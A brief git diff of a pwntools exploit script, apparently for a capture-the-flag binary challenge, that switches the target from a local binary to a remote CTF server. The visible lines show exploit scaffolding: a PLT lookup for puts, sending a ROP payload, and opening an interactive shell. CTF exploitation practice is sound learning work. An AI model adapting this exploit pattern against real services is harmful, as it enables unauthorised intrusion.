@@ -1,9 +1,9 @@
 from pwn import *
-#context.log_level = 'debug'
+context.log_level = 'debug'
 
 bina="./World_best_encryption_tool"
-#p=remote('ctf.j0n9hyun.xyz',3034)
-p=process(bina)
+p=remote('ctf.j0n9hyun.xyz',3034)
+#p=process(bina)
 e=ELF(bina)
 
 puts_plt=e.plt['puts']
@@ -41,3 +41,4 @@ p.sendline(ropay)
 p.recvuntil('Wanna encrypt other text? (Yes/No)')
 
 p.interactive()
+
